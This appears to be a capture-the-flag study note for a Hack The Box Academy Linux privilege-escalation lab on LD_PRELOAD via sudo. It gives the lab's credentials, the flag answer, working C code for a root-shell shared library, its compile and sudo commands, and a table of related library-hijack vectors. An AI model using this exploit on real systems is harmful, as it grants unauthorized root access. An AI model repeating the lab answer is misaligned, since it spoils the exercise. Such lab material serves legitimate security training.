# Section 20 — Shared Libraries (LD_PRELOAD)

> Lab: `ACADEMY-LPE-NIX02` · `ssh htb-student@<T>` (`Academy_LLPE!`)

## ✅ Answer (verified live)

| Q | Answer |
|---|--------|
| Q1 — `/root/ld_preload/flag.txt` via LD_PRELOAD | **`6a9c151a599135618b8f09adc78ab5f1`** |

Exploited `env_keep+=LD_PRELOAD` in sudoers + NOPASSWD `/usr/bin/openssl` → custom `.so` with `_init()` root shell → flag.

---

## Concept

Linux programs use **dynamic shared libraries** (`.so` files) loaded at runtime. The `LD_PRELOAD` environment variable forces a library to load before all others — functions in it override defaults. If `sudo` is configured with `env_keep+=LD_PRELOAD`, any sudo-allowed command will preload your malicious library **as root**.

**Two requirements:**
1. `sudo -l` shows `env_keep+=LD_PRELOAD`
2. User has at least one NOPASSWD sudo entry (any command works — doesn't need to be a GTFOBin)

---

## Identify

```bash
sudo -l
# Look for BOTH:
#   env_keep+=LD_PRELOAD        ← preload is preserved through sudo
#   (root) NOPASSWD: /some/cmd  ← any command will do
```
> The specific command doesn't matter — you're not exploiting the binary, you're exploiting the fact that sudo preserves LD_PRELOAD. Even a harmless command like `openssl version` triggers the library load as root.

---

## Exploit

**1. Write the malicious library:**
```bash
cat > /tmp/root.c << 'C'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
C
```
> `_init()` is a constructor — it runs automatically when the library is loaded, before main(). It unsets `LD_PRELOAD` first to prevent infinite recursion, then drops into a root shell.

**2. Compile as a shared object:**
```bash
gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
```
> `-fPIC` = position-independent code (required for .so). `-shared` = build as shared library. `-nostartfiles` = don't link standard startup code (we only need `_init`).

**3. Run any sudo-allowed command with LD_PRELOAD:**
```bash
sudo LD_PRELOAD=/tmp/root.so /usr/bin/openssl version
# uid=0(root)
```

**Non-interactive (SSH one-liner):**
```bash
echo 'cat /root/ld_preload/flag.txt' | sudo LD_PRELOAD=/tmp/root.so /usr/bin/openssl version
```

---

## Other Shared Library Attacks

| Vector | How to find | Exploit |
|--------|------------|---------|
| **LD_PRELOAD** (this lab) | `sudo -l` shows `env_keep+=LD_PRELOAD` | Compile `.so` with `_init()`, preload via sudo |
| **LD_LIBRARY_PATH** | `sudo -l` shows `env_keep+=LD_LIBRARY_PATH` | Create fake `.so` matching a library the sudo binary loads (`ldd /path/to/binary`), place in your controlled dir |
| **RPATH / RUNPATH** | `readelf -d /binary | grep -i path` points to writable dir | Drop malicious `.so` in the RPATH directory |
| **Missing shared object** | `ldd /binary` shows `not found` for a `.so`; binary is SUID or run by root | Create the missing `.so` in a searched path |
| **/etc/ld.so.conf** writable | `ls -la /etc/ld.so.conf /etc/ld.so.conf.d/` | Add your dir, `ldconfig`, drop `.so` — affects all binaries system-wide |

**Check libraries a binary needs:**
```bash
ldd /usr/bin/openssl              # list shared objects + paths
readelf -d /usr/bin/openssl | grep -i "needed\|rpath\|runpath"
```

---

## Exam / Engagement Notes

- **`sudo -l` is always the first command** after landing a shell. `env_keep+=LD_PRELOAD` = instant root if there's any NOPASSWD entry.
- The sudo command itself is irrelevant — `openssl`, `apache2 restart`, anything. The `.so` loads before the binary runs.
- Always use `unsetenv("LD_PRELOAD")` in `_init()` to avoid recursive loading.
- Full path to the `.so` is required: `sudo LD_PRELOAD=/tmp/root.so`, not `sudo LD_PRELOAD=root.so`.
- Compile flags: `-fPIC -shared -nostartfiles`. Missing any of these = build failure or non-functional library.

---

## Lab Walkthrough (quick steps)

```
1. ssh htb-student@<T>  (Academy_LLPE!)
2. sudo -l
   -> env_keep+=LD_PRELOAD
   -> (root) NOPASSWD: /usr/bin/openssl
3. Write /tmp/root.c (_init: unsetenv, setuid(0), system("/bin/bash"))
   gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
4. echo 'cat /root/ld_preload/flag.txt' | sudo LD_PRELOAD=/tmp/root.so /usr/bin/openssl version
   -> 6a9c151a599135618b8f09adc78ab5f1      ✅
```

> One line: `env_keep+=LD_PRELOAD` + any NOPASSWD sudo entry = compile `.so` with root shell constructor → preload via sudo → root.
